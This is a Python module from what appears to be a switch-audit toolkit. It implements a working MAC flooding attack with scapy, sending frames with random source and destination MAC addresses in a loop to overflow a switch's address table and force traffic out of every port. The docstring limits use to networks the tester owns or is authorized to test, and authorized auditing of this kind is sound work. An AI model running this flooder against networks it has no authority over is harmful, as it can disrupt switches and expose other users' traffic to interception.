"""MAC flooding: fills a switch's MAC address table (CAM) with fake addresses.

Each frame uses a random source MAC, so the switch learns one more entry, and a
random unicast destination that is not in the table, so the switch floods the
frame to every port. The audit observes both effects: the number of learned
addresses and the unknown-unicast traffic reaching other ports.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, Raw, sendp
from scapy.packet import Packet

from macabre.attacks.common import random_mac

PAYLOAD_SIZE = 46          # minimum Ethernet payload, avoids runt frames
EXPERIMENTAL_ETHERTYPE = 0x88B5  # IEEE 802 local experimental; hosts ignore it


@dataclass(frozen=True)
class MacFloodingConfig:
    iface: str
    count: int = 0            # frames to send; 0 = run until stopped
    interval: float = 0.0     # seconds between frames
    dry_run: bool = False     # build frames but do not send them


@dataclass
class FloodingStats:
    frames: int = 0


def build_flood_frame(rng: random.Random) -> Packet:
    """Frame with a random source MAC and an unknown unicast destination."""
    return (
        Ether(src=random_mac(rng), dst=random_mac(rng), type=EXPERIMENTAL_ETHERTYPE)
        / Raw(load=rng.randbytes(PAYLOAD_SIZE))
    )


def run_flooding(
    config: MacFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[FloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> FloodingStats:
    """Send flood frames until `count` is reached or `stop_event` is set."""
    rng = rng or random.Random()
    send = send or sendp
    stats = FloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_flood_frame(rng)
        if not config.dry_run:
            send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
